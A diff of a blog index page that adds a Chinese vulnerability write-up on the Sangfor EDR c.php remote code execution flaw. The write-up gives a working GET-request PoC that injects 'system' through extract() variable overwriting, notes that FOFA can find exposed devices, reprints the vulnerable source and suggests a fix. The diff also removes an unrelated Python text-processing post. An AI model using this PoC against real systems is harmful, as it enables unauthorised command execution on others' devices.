@@ -182,6 +182,92 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/18/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR-RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Quin">
+      <meta itemprop="description" content=""Just for fun"">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Quin's site">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/18/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR-RCE/" class="post-title-link" itemprop="url">深信服EDR_RCE</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-08-18 14:34:14 / Modified: 16:58:04" itemprop="dateCreated datePublished" datetime="2020-08-18T14:34:14+08:00">2020-08-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-RCE/" itemprop="url" rel="index"><span itemprop="name">漏洞分析, RCE</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>hw第一天，坊间开始流传深信服的EDR爆出漏洞。网上一搜就有老哥发了poc，<br>直接get方法rce，复现无门槛，作为爱凑热闹的菜鸡，当然要试试。</p>
+<h1 id="0x02-背景"><a href="#0x02-背景" class="headerlink" title="0x02 背景"></a>0x02 背景</h1><h2 id="什么是EDR"><a href="#什么是EDR" class="headerlink" title="什么是EDR"></a>什么是EDR</h2><p>EDR即终端检测响应平台，从官网简介中的【支持全类型终端的统一管理与集中策略下发】来看，EDR是一个内部终端管理平台，而这次的漏洞正存在于平台管理页面</p>
+<h1 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;XXX:xx&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;host&#x3D;ls</span><br></pre></td></tr></table></figure>
+
+<p>从poc来看，问题出在c.php，不过这名字起的真像个后门</p>
+<h1 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h1><h2 id="目标发现"><a href="#目标发现" class="headerlink" title="目标发现"></a>目标发现</h2><p>国内的设备发现自然首选fofa，直接搜索【深信服】就能弹出深信服EDR设备的搜索项，简单方便，比那些自己贴http指纹的不知道高到哪里去了。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>直接上poc，一发入魂，当然最重要的还是看看到底是什么在搞鬼</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;XXX:xx&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;host&#x3D;more c.php</span><br></pre></td></tr></table></figure>
+<p>浏览器渲染过的肯定不好看，右键查看源代码就方便扣出实际的c.php里的文件内容了</p>
+<h1 id="0x05-漏洞分析"><a href="#0x05-漏洞分析" class="headerlink" title="0x05 漏洞分析"></a>0x05 漏洞分析</h1><p>c.php的内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">::::::::::::::</span><br><span class="line">c.php</span><br><span class="line">::::::::::::::</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * c.php</span></span><br><span class="line"><span class="comment"> * 查看ldb的日志</span></span><br><span class="line"><span class="comment"> * 支持正则表达式过滤，可以过滤文件以及每行日志</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">call_user_func(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 编解码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $data 编解码数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string 返回编解码数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $code = <span class="function"><span class="keyword">function</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data); ++$i) &#123;</span><br><span class="line">            $data[$i] = $data[$i] ^ <span class="string">'G'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加密请求</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $site  站点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $query 请求串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string 返回请求URL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $request = <span class="function"><span class="keyword">function</span><span class="params">($site, $query)</span> <span class="title">use</span><span class="params">(&amp;$code)</span> </span>&#123;</span><br><span class="line">        $path = base64_encode($code($query));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"$site/$path"</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解密回复</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $data 回复数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array 返回回复数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $response = <span class="function"><span class="keyword">function</span><span class="params">($data)</span> <span class="title">use</span><span class="params">(&amp;$code)</span> </span>&#123;</span><br><span class="line">        $ret = json_decode($data, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_null($ret)) &#123;</span><br><span class="line">            $dec = $code(base64_decode($data));</span><br><span class="line">            $ret = json_decode($dec, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 找到匹配的日志</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path 文件路径匹配</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $item 日志项匹配</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $topn TOP N </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $host 主机</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array 返回匹配结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $collect = <span class="function"><span class="keyword">function</span><span class="params">($path, $item, $topn, $host)</span> <span class="title">use</span><span class="params">(&amp;$request, &amp;$response)</span> </span>&#123;</span><br><span class="line">        $path   = urlencode($path);</span><br><span class="line">        $item   = urlencode($item);</span><br><span class="line">        $result = file_get_contents($request(<span class="string">"http://127.0.0.1:8089"</span>, <span class="string">"op=ll&amp;host=$host&amp;path=$path&amp;item=$item&amp;top=$topn"</span>));</span><br><span class="line">        <span class="keyword">return</span> $response($result);</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 显示某个表单域</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $info 表单域信息, array("name" =&gt; "xx", "value" =&gt; "xxx", "note" =&gt; "help");</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $show_input = <span class="function"><span class="keyword">function</span><span class="params">($info)</span> </span>&#123;</span><br><span class="line">        extract($info);</span><br><span class="line">        $value = htmlentities($value);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;font size=2&gt;$title: &lt;/font&gt;&lt;input type=\"text\" size=30 id=\"$name\" name=\"$name\" value=\"$value\"&gt;&lt;font size=2&gt;$note&lt;/font&gt;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 去掉反斜杠</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $var 值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string 返回去掉反斜杠的值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $strip_slashes = <span class="function"><span class="keyword">function</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!get_magic_quotes_gpc()) &#123;</span><br><span class="line">            <span class="keyword">return</span> $var;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stripslashes($var);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 显示表单</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params 请求参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $show_form = <span class="function"><span class="keyword">function</span><span class="params">($params)</span> <span class="title">use</span><span class="params">(&amp;$strip_slashes, &amp;$show_input)</span> </span>&#123;</span><br><span class="line">        extract($params);</span><br><span class="line">        $host  = <span class="keyword">isset</span>($host)  ? $strip_slashes($host)  : <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        $path  = <span class="keyword">isset</span>($path)  ? $strip_slashes($path)  : <span class="string">""</span>;</span><br><span class="line">        $row   = <span class="keyword">isset</span>($row)   ? $strip_slashes($row)   : <span class="string">""</span>;</span><br><span class="line">        $limit = <span class="keyword">isset</span>($limit) ? $strip_slashes($limit) : <span class="number">1000</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 绘制表单</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;form id="studio" name="studio" method="post" action=""&gt;'</span>;</span><br><span class="line">        $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Host "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"host"</span>,  <span class="string">"value"</span> =&gt; $host,  <span class="string">"note"</span> =&gt; <span class="string">" - host, e.g. 127.0.0.1"</span>));</span><br><span class="line">        $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Path "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"path"</span>,  <span class="string">"value"</span> =&gt; $path,  <span class="string">"note"</span> =&gt; <span class="string">" - path regex, e.g. mapreduce"</span>));</span><br><span class="line">        $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Row  "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"row"</span>,   <span class="string">"value"</span> =&gt; $row,   <span class="string">"note"</span> =&gt; <span class="string">" - row regex, e.g. \s[w|e]\s"</span>));</span><br><span class="line">        $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Limit"</span>,  <span class="string">"name"</span> =&gt; <span class="string">"limit"</span>, <span class="string">"value"</span> =&gt; $limit, <span class="string">"note"</span> =&gt; <span class="string">" - top n, e.g. 100"</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" id="button"&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 入口函数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $argv 配置参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $main = <span class="function"><span class="keyword">function</span><span class="params">($argv)</span> </span></span><br><span class="line"><span class="function">        <span class="title">use</span><span class="params">(&amp;$collect)</span> </span>&#123;</span><br><span class="line">        extract($argv);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($limit)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $collect($path, $row, $limit, $host);</span><br><span class="line">        <span class="keyword">if</span> (!is_array($result)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $result, <span class="string">"\n"</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($result[<span class="string">"success"</span>]) || $result[<span class="string">"success"</span>] !== <span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $result, <span class="string">"\n"</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> ($result[<span class="string">"data"</span>] <span class="keyword">as</span> $host =&gt; $items) &#123;</span><br><span class="line">            $last = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($item[<span class="string">"name"</span>] != $last) &#123;</span><br><span class="line">                    $last = $item[<span class="string">"name"</span>];</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"\n[$host] -&gt; $last\n\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $item[<span class="string">"item"</span>], <span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" Content="text/html; Charset=utf-8"&gt;&lt;/head&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;body bgcolor="#e8ddcb"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;b&gt;Log Helper&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">    $show_form($_REQUEST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">    $main($_REQUEST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;  </span><br><span class="line">&#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$show_form($_REQUEST);   <span class="comment">// $_REQUEST可以获取以POST方法和GET方法提交的数据</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 显示表单</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params 请求参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $show_form = <span class="function"><span class="keyword">function</span><span class="params">($params)</span> <span class="title">use</span><span class="params">(&amp;$strip_slashes, &amp;$show_input)</span> </span>&#123;    <span class="comment">// function use表示使用了匿名函数，从外部传入了strip_slashes函数</span></span><br><span class="line">        extract($params);                                                   <span class="comment">// 这里传入了向url提交的数组，参数没有做处理</span></span><br><span class="line">        $host  = <span class="keyword">isset</span>($host)  ? $strip_slashes($host)  : <span class="string">"127.0.0.1"</span>;       <span class="comment">// 通过get参数传入strip_slahes和host、path、row、limit都能覆盖掉</span></span><br><span class="line">        $path  = <span class="keyword">isset</span>($path)  ? $strip_slashes($path)  : <span class="string">""</span>;</span><br><span class="line">        $row   = <span class="keyword">isset</span>($row)   ? $strip_slashes($row)   : <span class="string">""</span>;</span><br><span class="line">        $limit = <span class="keyword">isset</span>($limit) ? $strip_slashes($limit) : <span class="number">1000</span>;</span><br></pre></td></tr></table></figure>
+<p>php中extract会将传入的数组中的key作为变量名，value作为变量值导入到当前的符号表中。当某个变量已经存在时，可以通过设置第二个参数flag可以妥当处理。<br>但这里开发者没有考虑。因此通过get方法修改strip_slashes变量的值为system，然后修改传入的变量host值为系统命令即可任意RCE</p>
+<h1 id="0x06-修复"><a href="#0x06-修复" class="headerlink" title="0x06 修复"></a>0x06 修复</h1><p>设置extract的flag参数防止变量值被修改</p>
+<h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h1><p>一切用户输入都是不可预测的，凡是输入都要过滤处理，应该对参数中的system、phpinfo等敏感函数进行过滤</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/counting-sort/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -966,116 +1052,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/15/python%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Quin">
-      <meta itemprop="description" content=""Just for fun"">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Quin's site">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/11/15/python%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/" class="post-title-link" itemprop="url">python文本读写及初步处理</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2018-11-15 17:40:21" itemprop="dateCreated datePublished" datetime="2018-11-15T17:40:21+08:00">2018-11-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-07-10 22:39:30" itemprop="dateModified" datetime="2020-07-10T22:39:30+08:00">2020-07-10</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="打开文本"><a href="#打开文本" class="headerlink" title="打开文本"></a>打开文本</h1><p>pyhon打开文本主要有两种方式，即<code>open</code>和<code>with open</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp=open(path, <span class="string">'r'</span>)</span><br><span class="line">...</span><br><span class="line">fp.close()               <span class="comment">#记得关闭句柄</span></span><br></pre></td></tr></table></figure>
-<p>文件使用后必须关闭，因为文件对象会占用系统资源，并且系统同一时间能打开的文件是有限的<br>由于，文件读写时可能产生IOError，一旦出错，fp.close()将不会被调用，系统资源无法被释放<br>，因此我们应使用<code>try finally</code>：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    fp = open(path, <span class="string">'r'</span>) </span><br><span class="line">    print(fp.read())</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> fp:</span><br><span class="line">        fp.close()</span><br></pre></td></tr></table></figure>
-<p>当然直接用<code>with open</code>是坠吼的：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(path, <span class="string">'r'</span>) <span class="keyword">as</span> fp:   <span class="comment">#自动关闭句柄</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<h2 id="打开模式"><a href="#打开模式" class="headerlink" title="打开模式"></a>打开模式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp=open(path, <span class="string">'r'</span>)    <span class="comment">#只读</span></span><br><span class="line">fp=open(path, <span class="string">'w'</span>)    <span class="comment">#写(重写整个文件，若不存在则创建)</span></span><br><span class="line">fp=open(path, <span class="string">'a'</span>)    <span class="comment">#附加(在源文本基础上添加)</span></span><br><span class="line">fp=open(path, <span class="string">'b'</span>)    <span class="comment">#以二进制方式打开，通常可以解决一些编码问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这些组合也可以叠加</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="读取文本"><a href="#读取文本" class="headerlink" title="读取文本"></a>读取文本</h1><p>python读取文本主要是三个方法<code>read()</code>,<code>readline()</code>, <code>readlines()</code></p>
-<p>read()方法将文本内容一次性全部读入字符串中，通常速度最快，但如果文本过大，<br>则会占用太多的内存。当然也可以通过限制读取字节数来限制读取量</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(file, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    lines = fp.read()</span><br></pre></td></tr></table></figure>
-<p>readline()方法逐行读取文本，速度较慢</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(file, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    line = fp.readline()</span><br><span class="line">    <span class="keyword">while</span> line:</span><br><span class="line">        <span class="keyword">print</span> line</span><br><span class="line">        line = fp.readline()</span><br></pre></td></tr></table></figure>
-<p>readlines()方法会一次读取全部文本，并将结果放入list中,速度较快</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(file, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    lines = fp.readliens()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    print(line)</span><br></pre></td></tr></table></figure>
-<p>需要注意的是，这三种方法实际上都将文本末尾的换行’\n’读取进来了，因此需要<br>去掉行尾的’\n’。</p>
-<h1 id="行处理"><a href="#行处理" class="headerlink" title="行处理"></a>行处理</h1><h2 id="去掉字符串前后的字符"><a href="#去掉字符串前后的字符" class="headerlink" title="去掉字符串前后的字符"></a>去掉字符串前后的字符</h2><p>去掉字符串前后的字符，可以通过<code>rstrip</code>,<code>strip</code>,<code>lstrip</code>来实现<br>rstrip()方法删除字符串末尾的指定字符，默认为空格，(rstrip中的r即右)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str.rstrip()</span><br><span class="line">str.rstrip(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
-<p>lstrip()方法删除字符串开头的指定字符(l即左边)</p>
-<p>strip()方法删除字符串首尾的指定字符</p>
-<h2 id="字符串分割"><a href="#字符串分割" class="headerlink" title="字符串分割"></a>字符串分割</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.path.split(str)    <span class="comment"># 分割文件名和路径名，结果为两个元素的list</span></span><br><span class="line">str.split(<span class="string">"\")        # 将str按照字符"</span>\<span class="string">"来分割，注意这是两个不同的方法</span></span><br></pre></td></tr></table></figure>
-<p>python中字符串本质其实是一个list,通过枚举的方法可以将字符串分成单个字符</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> str:</span><br><span class="line">    list.append(str)      <span class="comment"># 这样就将字符串str中的字符分别放入list中了</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="字符串分割为list后对list进行处理"><a href="#字符串分割为list后对list进行处理" class="headerlink" title="字符串分割为list后对list进行处理"></a>字符串分割为list后对list进行处理</h2><p>通常在操作目录或者别的字符串时需要去掉某些字符，通过分割字符串为列表之后，<br>可以直接通过list自带的分割来抛弃list中的某些部分</p>
